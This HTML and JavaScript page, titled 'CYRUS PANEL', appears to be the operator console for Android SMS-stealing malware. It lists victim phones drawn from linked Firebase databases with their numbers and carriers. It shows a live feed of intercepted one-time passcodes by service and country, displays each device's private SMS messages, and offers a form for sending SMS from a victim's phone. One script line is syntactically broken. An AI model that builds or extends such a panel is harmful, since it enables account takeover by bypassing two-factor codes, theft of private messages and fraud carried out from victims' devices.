<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dashboard · CYRUS PANEL</title>
  <link rel="icon" type="image/svg+xml" href="/pronxt-logo.svg">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/assets/app.css">
  <script src="/assets/icons.js"></script>
</head>
<body>
  <div class="app-shell">
    <header class="topbar">
      <div class="topbar-inner">
        <a class="brand" href="/"><img src="/pronxt-logo.svg" alt=""><span><strong>CYRUS PANEL</strong><small>Dashboard</small></span></a>
        <nav class="topbar-nav" id="nav"><a href="/dashboard/" class="active">Dashboard</a><a href="/profile/">Profile</a><button onclick="logout()">Logout</button></nav>
      </div>
    </header>
    <main class="main-content">
      <div class="page-header"><h1>Dashboard</h1><p id="subtitle">Loading all devices from connected databases...</p></div>
      <div id="alert" class="alert" style="display:none"></div>

      <!-- Stats -->
      <div class="stats-grid">
        <div class="stat-card"><div class="stat-value" style="color:var(--green)" id="s-online">—</div><div class="stat-label">Online Devices</div></div>
        <div class="stat-card"><div class="stat-value" style="color:var(--accent)" id="s-total">—</div><div class="stat-label">Total Devices</div></div>
        <div class="stat-card"><div class="stat-value" style="color:var(--purple)" id="s-otps">—</div><div class="stat-label">Recent OTPs</div></div>
        <div class="stat-card"><div class="stat-value" style="color:var(--amber)" id="s-conn">—</div><div class="stat-label">Active Databases</div></div>
      </div>

      <!-- Tabs -->
      <div class="tabs">
        <button class="tab active" data-tab="devices"><span class="icon" style="width:14px;height:14px;margin-right:4px"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg></span>Devices</button>
        <button class="tab" data-tab="otps"><span class="icon" style="width:14px;height:14px;margin-right:4px"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 11-7.778 7.778 5.5 5.5 0 017.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg></span>OTP Feed</button>
      </div>

      <!-- Devices Tab -->
      <div id="tab-devices" class="tab-content">
        <div class="card">
          <div class="card-header">
            <div><div class="card-title">All Devices</div><div class="card-subtitle" id="devCount">Loading...</div></div>
            <button class="btn btn-secondary btn-sm" onclick="loadDashboard()"><span class="icon" style="width:14px;height:14px"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"></path></svg></span> Refresh</button>
          </div>
          <div id="deviceList"><div class="empty-state"><div class="spinner" style="margin:0 auto 1rem"></div><p>Loading devices...</p></div></div>
        </div>
      </div>

      <!-- OTP Tab -->
      <div id="tab-otps" class="tab-content" style="display:none">
        <div class="card">
          <div class="card-header">
            <div><div class="card-title">Live OTP Feed</div><div class="card-subtitle">Auto-refreshes every 15 seconds</div></div>
            <button class="btn btn-secondary btn-sm" onclick="loadDashboard()"><span class="icon" style="width:14px;height:14px"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"></path></svg></span> Refresh</button>
          </div>
          <div id="otpList"><div class="empty-state"><div class="spinner" style="margin:0 auto 1rem"></div><p>Loading OTPs...</p></div></div>
        </div>
      </div>
    </main>
  </div>

  <!-- Device Detail Modal -->
  <div id="deviceModal" style="display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,0.7);backdrop-filter:blur(4px);align-items:center;justify-content:center;padding:1rem">
    <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);max-width:600px;width:100%;max-height:85vh;overflow-y:auto;padding:1.5rem">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem">
        <h2 id="modalTitle" style="font-size:1.125rem">Device</h2>
        <button class="btn btn-secondary btn-sm" onclick="closeModal()"><span class="icon" style="width:14px;height:14px"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></span> Close</button>
      </div>
      <div id="modalBody"></div>
    </div>
  </div>

  <script>
    let currentUser = null;
    let dashboardData = null;

    async function init() {
      const res = await fetch("/api/auth/me", { credentials: "include" });
      if (!res.ok) { window.location.href = "/login"; return; }
      const data = await res.json();
      currentUser = data.user;
      if (currentUser.role === "admin") {
        const nav = document.getElementById("nav");
        const a = document.createElement("a"); a.href = "/admin/"; a.textContent = "<span class="icon" style="width:14px;height:14px"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg></span> Admin";
        nav.insertBefore(a, nav.children[1]);
      }
      loadDashboard();
      setInterval(loadDashboard, 30000);
    }

    async function loadDashboard() {
      try {
        const res = await fetch("/api/dashboard", { credentials: "include" });
        if (!res.ok) throw new Error("Failed");
        dashboardData = await res.json();
        render(dashboardData);
      } catch (err) {
        document.getElementById("subtitle").textContent = "Error loading dashboard: " + err.message;
      }
    }

    function render(d) {
      document.getElementById("s-online").textContent = d.devices.online;
      document.getElementById("s-total").textContent = d.devices.total;
      document.getElementById("s-otps").textContent = d.otps.total;
      document.getElementById("s-conn").textContent = d.connections;
      document.getElementById("subtitle").textContent = `${d.devices.online} online of ${d.devices.total} devices · ${d.connections} database(s)`;
      document.getElementById("devCount").textContent = `${d.devices.total} device(s) from ${d.connections} database(s)`;
      renderDevices(d.devices.list);
      renderOtps(d.otps.recent);
    }

    function renderDevices(devices) {
      const el = document.getElementById("deviceList");
      if (!devices.length) {
        el.innerHTML = `<div class="empty-state"><h3>No devices</h3><p>No devices connected yet. Admin needs to add Firebase databases first.</p></div>`;
        return;
      }
      let html = `<div class="table-wrap"><table><thead><tr><th>Device</th><th>Android</th><th>Battery</th><th>Phone</th><th>Network</th><th>Status</th><th>Source</th><th></th></tr></thead><tbody>`;
      for (const d of devices) {
        const badge = d.status ? '<span class="badge badge-green">● Online</span>' : '<span class="badge badge-red">● Offline</span>';
        const bat = d.batteryPercent >= 60 ? '#86efac' : d.batteryPercent >= 30 ? '#fde68a' : '#ef4444';
        html += `<tr>
          <td><strong>${esc(d.name)}</strong><br><span style="font-size:0.65rem;color:#555;font-family:monospace">${esc(d.id).slice(0,16)}...</span></td>
          <td>${d.android !== "—" ? "v" + d.android.replace("v","") : "—"}</td>
          <td><span style="color:${bat}">${d.batteryPercent}%</span></td>
          <td style="font-family:monospace;font-size:0.75rem">${esc(d.phoneNumber)}</td>
          <td>${esc(d.provider)}</td>
          <td>${badge}</td>
          <td><span style="font-size:0.65rem;color:#666">${esc(d.source || "")}</span></td>
          <td><button class="btn btn-secondary btn-sm" onclick="viewDevice('${esc(d.id)}')">View</button></td>
        </tr>`;
      }
      html += "</tbody></table></div>";
      el.innerHTML = html;
    }

    function renderOtps(otps) {
      const el = document.getElementById("otpList");
      if (!otps.length) {
        el.innerHTML = `<div class="empty-state"><h3>No OTPs</h3><p>No OTP messages found in connected databases yet.</p></div>`;
        return;
      }
      let html = `<div class="table-wrap"><table><thead><tr><th>Service</th><th>Code</th><th>Phone</th><th>Country</th><th>Time</th><th>Source</th></tr></thead><tbody>`;
      for (const o of otps) {
        html += `<tr>
          <td><span class="badge badge-purple">${esc(o.service)}</span></td>
          <td><strong style="color:#22d3ee;font-family:monospace;font-size:1rem">${esc(o.code)}</strong></td>
          <td style="font-family:monospace;font-size:0.75rem">${esc(o.phone)}</td>
          <td style="font-size:0.75rem">${esc(o.country)}</td>
          <td style="font-size:0.7rem;color:#666">${esc(o.timestamp).slice(0,19)}</td>
          <td style="font-size:0.65rem;color:#555">${esc(o.source || "")}</td>
        </tr>`;
      }
      html += "</tbody></table></div>";
      el.innerHTML = html;
    }

    async function viewDevice(id) {
      const modal = document.getElementById("deviceModal");
      modal.style.display = "flex";
      document.getElementById("modalTitle").textContent = "Loading...";
      document.getElementById("modalBody").innerHTML = '<div class="spinner" style="margin:1rem auto"></div>';
      try {
        const res = await fetch(`/api/dashboard/devices/${id}`, { credentials: "include" });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        const d = data.device;
        document.getElementById("modalTitle").textContent = d.name;
        let html = `<div style="display:grid;grid-template-columns:1fr 1fr;gap:0.75rem;margin-bottom:1.5rem">`;
        const fields = [["Model", d.model], ["Android", d.android], ["Battery", d.batteryPercent + "%"], ["Phone", d.phoneNumber], ["Network", d.provider], ["Status", d.status ? "Online" : "Offline"], ["Source", d.source || "—"], ["Last Seen", d.lastSeen || "—"]];
        for (const [l, v] of fields) html += `<div><div style="font-size:0.65rem;color:#666;text-transform:uppercase;letter-spacing:0.08em">${l}</div><div style="font-size:0.875rem;font-weight:600;margin-top:0.125rem">${esc(String(v))}</div></div>`;
        html += `</div>`;
        if (data.messages.length) {
          html += `<h3 style="font-size:0.875rem;margin-bottom:0.75rem">Recent Messages (${data.messages.length})</h3>`;
          html += `<div style="max-height:200px;overflow-y:auto;border:1px solid #1a1a1a;border-radius:8px">`;
          for (const m of data.messages.slice(0, 20)) {
            html += `<div style="padding:0.5rem 0.75rem;border-bottom:1px solid #1a1a1a;font-size:0.75rem"><div style="color:#888;font-size:0.65rem">${esc(m.sender)} · ${esc(String(m.timestamp || ""))}</div><div style="margin-top:0.25rem">${esc(m.text).slice(0, 150)}</div></div>`;
          }
          html += `</div>`;
        }
        // SMS form
        html += `<div style="margin-top:1.5rem;padding-top:1rem;border-top:1px solid #1a1a1a"><h3 style="font-size:0.875rem;margin-bottom:0.75rem">Send SMS</h3>
          <div style="display:flex;gap:0.5rem"><input class="form-input" id="sms-to" placeholder="Phone number" style="flex:1"><input class="form-input" id="sms-msg" placeholder="Message" style="flex:2">
          <button class="btn btn-primary btn-sm" onclick="sendSms('${id}')">Send</button></div></div>`;
        document.getElementById("modalBody").innerHTML = html;
      } catch (err) {
        document.getElementById("modalBody").innerHTML = `<div class="alert alert-error">${err.message}</div>`;
      }
    }

    async function sendSms(id) {
      const to = document.getElementById("sms-to").value;
      const message = document.getElementById("sms-msg").value;
      if (!to || !message) return showAlert("Fill phone and message", "error");
      try {
        const res = await fetch(`/api/dashboard/devices/${id}/sms`, {
          method: "POST", headers: { "Content-Type": "application/json" }, credentials: "include",
          body: JSON.stringify({ to, message }),
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        showAlert("SMS queued!", "success");
      } catch (err) { showAlert(err.message, "error"); }
    }

    function closeModal() { document.getElementById("deviceModal").style.display = "none"; }

    // Tabs
    document.querySelectorAll(".tab").forEach(t => t.addEventListener("click", () => {
      document.querySelectorAll(".tab").forEach(x => x.classList.remove("active"));
      document.querySelectorAll(".tab-content").forEach(x => x.style.display = "none");
      t.classList.add("active");
      document.getElementById("tab-" + t.dataset.tab).style.display = "block";
    }));

    function showAlert(msg, type) { const el = document.getElementById("alert"); el.className = "alert alert-" + type; el.textContent = msg; el.style.display = "flex"; setTimeout(() => el.style.display = "none", 4000); }
    function esc(s) { const d = document.createElement("div"); d.textContent = s; return d.innerHTML; }
    async function logout() { await fetch("/api/auth/logout", { method: "POST", credentials: "include" }); window.location.href = "/login"; }

    init();
  </script>
</body>
</html>
